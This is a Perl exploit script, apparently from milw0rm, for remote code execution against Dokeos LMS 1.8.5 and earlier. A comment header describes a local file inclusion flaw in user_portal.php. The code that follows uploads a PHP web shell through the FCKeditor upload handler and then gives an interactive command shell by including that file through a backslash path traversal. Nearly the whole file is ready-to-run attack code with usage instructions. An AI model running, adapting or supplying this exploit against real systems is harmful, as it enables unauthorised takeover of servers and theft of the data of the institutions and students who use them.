#!/usr/bin/perl
#
# Dokeos LMS <= 1.8.5 "include" Remote Code Execution Exploit
# 
# Description
# ---------------------------------------------------------------
# Dokeos LMS contains one flaw that allows an attacker to include
# a local file with "html" extension. 
# The issue is due to 'user_portal.php' script not properly
# sanitizing user input supplied to the 'include' GET variable.
# ---------------------------------------------------------------
# Code Details (user_portal.php Line 770 - 774)
# ---------------------------------------------------------------
# if (!empty ($_GET['include']) && !strstr($_GET['include'], '/') 
# && strstr($_GET['include'], '.html'))
# 
# {
#       include ('./home/'.$_GET['include']);
#	$pageIncluded = true;
#  }
# ---------------------------------------------------------------
# As you can see,it's possible to include files with "html" ext
# and "/" isn't allowed,seems be a valid fix.It's useless on win
# because you can use "\" to change directory.
# This LFI is useful because in Dokeos LMS fckeditor exists in
# /main/inc/lib/fckeditor/editor/filemanager/upload/php/upload.php
# you can upload a file with ".html" extension. You'll have a rce
# 
# Example: user_portal.php?include=..\main\upload\[FILE].html
# it works regardless of php.ini settings on windows system only
# ---------------------------------------------------------------
# Thanks to Aquilo of http://zeroidentity.org - and #zeroidentity
# ---------------------------------------------------------------
# http://www.youtube.com/watch?v=JxZcFArCeKs english 
# http://www.youtube.com/watch?v=txY52DTtFhQ italian
# ---------------------------------------------------------------
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it
# ---------------------------------------------------------------

use IO::Socket;
use LWP::UserAgent;
use HTTP::Cookies;


my ($host,$path,$user,$pass) = @ARGV;

if (@ARGV < 4) {
      print "Dokeos LMS <= 1.8.5 Remote Code Execution Exploit\n";
      x__usage();
}
      

do_exploit();
                               

sub shell_up()
{ 
       my ($data,$packet,$result);
       
       my $vector = chr(45) x27;
       my $socket = new IO::Socket::INET(
                                          PeerAddr => $host,
                                          PeerPort => 80,
                                          Proto    => 'tcp',
                                        ) or die $!;
        
       
       $data .= $vector."--uploading\r\n";
       $data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"yeat.html\"\r\n";
       $data .= "Content-Type: unknown/unknown\r\n\r\n";
       $data .= "<?php error_reporting(E_ALL); if(isset(\$_GET['cmd'])){die(eval(stripslashes(\$_GET['cmd'])));} ?>\r\n";
       $data .= $vector."--uploading--\r\n";

       $packet .= "POST $path/main/inc/lib/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.0\r\n";
       $packet .= "Content-Type: multipart/form-data; boundary=".$vector."uploading\r\n";
       $packet .= "Host: $host\r\n";
       $packet .= "User-Agent :Lynx (textmode)\r\n";
       $packet .= "Content-Length: ".length($data)."\r\n";
       $packet .= "Connection: Close\r\n\r\n";
       $packet .= $data;

       $socket->send($packet);

       foreach $result (<$socket>) { 
             
             if ($result =~ /OnUploadCompleted\(0,"(.+?)"/i) {
                   return $1;
             }
       }                
}


sub do_exploit()
{
       my ($_riot,$shell,$cmd,$login);
       
       my $cookie = new HTTP::Cookies  || die $!;
       my $sock_u = new LWP::UserAgent || die $!;
       
       $sock_u->cookie_jar($cookie);                             
       $sock_u->agent('Lynx (textmode)');
       $sock_u->timeout(5);
       
       $_riot = shell_up() =~ /upload\/(.*)/i ? $1 : 0;
           
       $login = $sock_u->post("http://$host/$path/index.php",
                           [ 
                             login => $user,
                             password => $pass,
                             submitAuth => 'Confirm',
                           ]) || die $!;
       
       unless ($login->content =~ /class="logout"/i) {
          die("Login failed..\n");
       }   
                           
      
       while (1) {
             print "\nyeat[shell]:~\$ ";
          
             chomp($cmd = <STDIN>);
          
             if ($cmd !~ /^exit+$/i) {
                   $shell = $sock_u->get("http://$host/$path/user_portal.php?include=..\\main\\upload\\$_riot&cmd=$cmd");
                  
                   if ($shell->content =~ /<div class="maincontent">(.*)/i) {
                         print $1;
                   }  
                   else {
                         print "No output here..\n";
                   }           
             }
             else {
                die("Exited successful..\n");
             }         
      }
}
      

sub x__usage()
{
       print "Usage: perl xpl.pl host /path/ username password\n";
       print "RunEx: perl localhost /dokeos/ yeat anarchy\n";
       exit;
}       

# milw0rm.com [2009-04-22]
